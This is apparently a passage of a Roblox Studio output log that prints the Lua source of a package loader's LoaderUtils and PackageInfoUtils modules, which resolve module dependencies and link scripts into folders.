	end
end

function LoaderUtils.reifyGroupList(groupInfoList, publishSet, parent, replicationMode)
	assert(type(groupInfoList) == "table", "Bad groupInfoList")
	assert(type(publishSet) == "table", "Bad publishSet")
	assert(typeof(parent) == "Instance", "Bad parent")
	assert(type(replicationMode) == "string", "Bad replicationMode")

	local folder = Instance.new("Folder")
	folder.Name = "_Index"

	for _, groupInfo in pairs(groupInfoList) do
		if LoaderUtils.needToReify(groupInfo, replicationMode) then
			LoaderUtils.reifyGroup(groupInfo, folder, replicationMode)
		end
	end

	-- Publish
	for packageInfo, _ in pairs(publishSet) do
		for scriptName, scriptInfo in pairs(packageInfo.scriptInfoLookup[replicationMode]) do
			local link = BounceTemplateUtils.create(scriptInfo.instance, scriptName)
			link.Parent = parent
		end
	end

	folder.Parent = parent
end

function LoaderUtils.getPublishPackageInfoSet(packageInfoList)
	local packageInfoSet = {}
	for _, packageInfo in pairs(packageInfoList) do
		packageInfoSet[packageInfo] = true
		-- First level declared dependencies too (assuming we're importing just one item)
		for dependentPackageInfo, _ in pairs(packageInfo.explicitDependencySet) do
			packageInfoSet[dependentPackageInfo] = true
		end
	end
	return packageInfoSet
end

function LoaderUtils.needToReify(groupInfo, replicationMode)
	for _, scriptInfo in pairs(groupInfo.packageScriptInfoMap) do
		if scriptInfo.replicationMode == replicationMode then
			return true
		end
	end

	return false
end

function LoaderUtils.reifyGroup(groupInfo, parent, replicationMode)
	assert(type(groupInfo) == "table", "Bad groupInfo")
	assert(typeof(parent) == "Instance", "Bad parent")
	assert(type(replicationMode) == "string", "Bad replicationMode")

	local folder = Instance.new("Folder")
	folder.Name = assert(next(groupInfo.packageSet).fullName, "Bad package fullName")

	for scriptName, scriptInfo in pairs(groupInfo.packageScriptInfoMap) do
		assert(scriptInfo.name == scriptName, "Bad scriptInfo.name")

		if scriptInfo.replicationMode == replicationMode then
			if scriptInfo.instance == loader and loader.Parent == game:GetService("ReplicatedStorage") then
				-- Hack to prevent reparenting of loader in legacy mode
				local link = BounceTemplateUtils.create(scriptInfo.instance, scriptName)
				link.Parent = folder
			else
				scriptInfo.instance.Name = scriptName
				scriptInfo.instance.Parent = folder
			end
		else
			if scriptInfo.instance == loader then
				local link = BounceTemplateUtils.create(scriptInfo.instance, scriptName)
				link.Parent = folder
			else
				-- Turns out creating these links are a LOT faster than cloning a module script
				local link = BounceTemplateUtils.createLink(scriptInfo.instance, scriptName)
				link.Parent = folder
			end
		end
	end

	-- Link all of the other dependencies
	for scriptName, scriptInfo in pairs(groupInfo.scriptInfoMap) do
		assert(scriptInfo.name == scriptName, "Bad scriptInfo.name")

		if not groupInfo.packageScriptInfoMap[scriptName] then
			if scriptInfo.instance == loader then
				local link = BounceTemplateUtils.create(scriptInfo.instance, scriptName)
				link.Parent = folder
			else
				-- Turns out creating these links are a LOT faster than cloning a module script
				local link = BounceTemplateUtils.createLink(scriptInfo.instance, scriptName)
				link.Parent = folder
			end
		end
	end

	folder.Parent = parent
end

return LoaderUtils  -  Editar
  04:54:13.788    -  Editar
  04:54:13.788  ----- [2411] ServerScriptService.Scripts.Core.SoftShutdown.src.node_modules.@quenty.attributeutils.node_modules.@quenty.loader.PackageInfoUtils -----  -  Editar
  04:54:13.788  --[=[
	Utility methods to build a virtual graph of the existing package information set
	@private
	@class PackageInfoUtils
]=]

local BounceTemplateUtils = require(script.Parent.BounceTemplateUtils)
local LoaderConstants = require(script.Parent.LoaderConstants)
local Queue = require(script.Parent.Queue)
local ScriptInfoUtils = require(script.Parent.ScriptInfoUtils)
local Utils = require(script.Parent.Utils)

local PackageInfoUtils = {}

function PackageInfoUtils.createPackageInfo(packageFolder, explicitDependencySet, scriptInfoLookup, fullName)
	assert(typeof(packageFolder) == "Instance", "Bad packageFolder")
	assert(type(explicitDependencySet) == "table", "Bad explicitDependencySet")
	assert(type(scriptInfoLookup) == "table", "Bad scriptInfoLookup")
	assert(type(fullName) == "string", "Bad fullName")

	return Utils.readonly({
		name = packageFolder.Name;
		fullName = fullName;
		instance = packageFolder;
		explicitDependencySet = explicitDependencySet;
		dependencySet = false; -- will be filled in later, contains ALL expected dependencies
		scriptInfoLookup = scriptInfoLookup;
	})
end

function PackageInfoUtils.createDependencyQueueInfo(packageInfo, implicitDependencySet)
	assert(type(packageInfo) == "table", "Bad packageInfo")
	assert(type(implicitDependencySet) == "table", "Bad implicitDependencySet")

	return Utils.readonly({
		packageInfo = packageInfo;
		implicitDependencySet = implicitDependencySet;
	})
end

function PackageInfoUtils.fillDependencySet(packageInfoList)
	assert(type(packageInfoList) == "table", "Bad packageInfoList")

	local queue = Queue.new()
	local seen = {}

	do
		local topDependencySet = {}
		for _, packageInfo in pairs(packageInfoList) do
			if not seen[packageInfo] then
				topDependencySet[packageInfo] = packageInfo
				seen[packageInfo] = true
				queue:PushRight(PackageInfoUtils.createDependencyQueueInfo(packageInfo, topDependencySet))
			end
		end
	end

	-- Flaw: We can enter this dependency chain from multiple paths (we're a cyclic directed graph, not a tree)
	-- TODO: Determine node_modules behavior and copy it (hopefully any link upwards words)
	-- For now we do breadth first resolution of this to ensure minimal dependencies are accumulated for deep trees
	while not queue:IsEmpty() do
		local queueInfo = queue:PopLeft()
		assert(not queueInfo.packageInfo.dependencySet, "Already wrote dependencySet")

		local dependencySet = PackageInfoUtils
			.computePackageDependencySet(queueInfo.packageInfo, queueInfo.implicitDependencySet)
		queueInfo.packageInfo.dependencySet = dependencySet

		-- Process all explicit dependencies for the next level
		for packageInfo, _ in pairs(queueInfo.packageInfo.explicitDependencySet) do
			if not seen[packageInfo] then
				seen[packageInfo] = true
				queue:PushRight(PackageInfoUtils.createDependencyQueueInfo(packageInfo, dependencySet))
			end
		end
	end
end

function PackageInfoUtils.computePackageDependencySet(packageInfo, implicitDependencySet)
	assert(type(packageInfo) == "table", "Bad packageInfo")
	assert(type(implicitDependencySet) == "table", "Bad implicitDependencySet")

	-- assume folders with the same name are the same module
	local dependencyNameMap = {}

	-- Set implicit dependencies
	if LoaderConstants.INCLUDE_IMPLICIT_DEPENDENCIES then
		for entry, _ in pairs(implicitDependencySet) do
			dependencyNameMap[entry.name] = entry
		end
	end

	-- These override implicit ones
	for entry, _ in pairs(packageInfo.explicitDependencySet) do
		dependencyNameMap[entry.name] = entry
	end

	-- clear ourself as a dependency
	dependencyNameMap[packageInfo.name] = nil

	-- Note we leave conflicting scripts here as unresolved. This will output an error later.
	local dependencySet = {}
	for _, entry in pairs(dependencyNameMap) do
		dependencySet[entry] = true
	end

	return dependencySet
end

function PackageInfoUtils.getOrCreatePackageInfo(packageFolder, packageInfoMap, scope, defaultReplicationType)
	assert(typeof(packageFolder) == "Instance", "Bad packageFolder")
	assert(type(packageInfoMap) == "table", "Bad packageInfoMap")
	assert(type(scope) == "string", "Bad scope")
	assert(defaultReplicationType, "No defaultReplicationType")

	if packageInfoMap[packageFolder] then
		return packageInfoMap[packageFolder]
	end

	local scriptInfoLookup = ScriptInfoUtils.createScriptInfoLookup()
	ScriptInfoUtils.populateScriptInfoLookup(
		packageFolder,
		scriptInfoLookup,
		defaultReplicationType)

	local explicitDependencySet = {}
	local fullName
	if scope == "" then
		fullName = packageFolder.Name
	else
		fullName = scope .. "/" .. packageFolder.Name
	end

	local packageInfo = PackageInfoUtils
		.createPackageInfo(packageFolder, explicitDependencySet, scriptInfoLookup, fullName)
	packageInfoMap[packageFolder] = packageInfo

	-- Fill this after we've registered ourselves, in case we're somehow in a recursive dependency set
	PackageInfoUtils.fillExplicitPackageDependencySet(
		explicitDependencySet,
		packageFolder,
		packageInfoMap,
		defaultReplicationType)

	return packageInfo
end

function PackageInfoUtils.getPackageInfoListFromDependencyFolder(folder, packageInfoMap, defaultReplicationType)
	assert(typeof(folder) == "Instance" and folder:IsA("Folder"), "Bad folder")
	assert(type(packageInfoMap) == "table", "Bad packageInfoMap")
	assert(defaultReplicationType, "No defaultReplicationType")


	local packageInfoList = {}

	-- Assume we are at the dependency level
	for _, instance in pairs(folder:GetChildren()) do
		if instance:IsA("Folder") then
			-- We loop through each "@quenty" or "@blah" and convert to a package
			if instance.Name:sub(1, 1) == "@" then
				local scope = instance.Name
				for _, child in pairs(instance:GetChildren()) do
					PackageInfoUtils.tryLoadPackageFromInstance(packageInfoList, packageInfoMap, child, scope, defaultReplicationType)
				end
			else
				PackageInfoUtils.tryLoadPackageFromInstance(packageInfoList, packageInfoMap, instance, "", defaultReplicationType)
			end
		else
			warn(("Unknown instance in dependencyFolder - %q"):format(instance:GetFullName()))
		end
	end

	return packageInfoList
end

function PackageInfoUtils.tryLoadPackageFromInstance(
	packageInfoList, packageInfoMap, instance, scope, defaultReplicationType)

	assert(type(packageInfoList) == "table", "Bad packageInfoList")
	assert(type(packageInfoMap) == "table", "Bad packageInfoMap")
	assert(typeof(instance) == "Instance", "Bad instance")
	assert(type(scope) == "string", "Bad scope")
	assert(defaultReplicationType, "No defaultReplicationType")

	if BounceTemplateUtils.isBounceTemplate(instance) then
		return
	end

	if instance:IsA("Folder") or instance:IsA("ModuleScript") then
		table.insert(packageInfoList, PackageInfoUtils.getOrCreatePackageInfo(
			instance, packageInfoMap, scope, defaultReplicationType))
	elseif instance:IsA("ObjectValue") then
		local value = instance.Value
		if value and (value:IsA("Folder") or value:IsA("ModuleScript")) then
			table.insert(packageInfoList, PackageInfoUtils.getOrCreatePackageInfo(
				value, packageInfoMap, scope, defaultReplicationType))
		else
			error(("Invalid %q ObjectValue in package linking to nothing cannot be resolved into package dependency\n\t-> %s")
				:format(instance.Name, instance:GetFullName()))
		end
	end
end

-- Explicit dependencies are dependencies that are are explicitly listed.
-- These dependencies are available to this package and ANY dependent packages below
function PackageInfoUtils.fillExplicitPackageDependencySet(
	explicitDependencySet, packageFolder, packageInfoMap, defaultReplicationType)

	assert(type(explicitDependencySet) == "table", "Bad explicitDependencySet")
	assert(typeof(packageFolder) == "Instance", "Bad packageFolder")
	assert(type(packageInfoMap) == "table", "Bad packageInfoMap")
	assert(defaultReplicationType, "No defaultReplicationType")

	for _, item in pairs(packageFolder:GetChildren()) do
		if item:IsA("Folder") and item.Name == ScriptInfoUtils.DEPENDENCY_FOLDER_NAME then
			local packageInfoList = PackageInfoUtils.getPackageInfoListFromDependencyFolder(
				item,
				packageInfoMap,
				defaultReplicationType)

			for _, packageInfo in pairs(packageInfoList) do
				explicitDependencySet[packageInfo] = true
			end
		end
	end
end
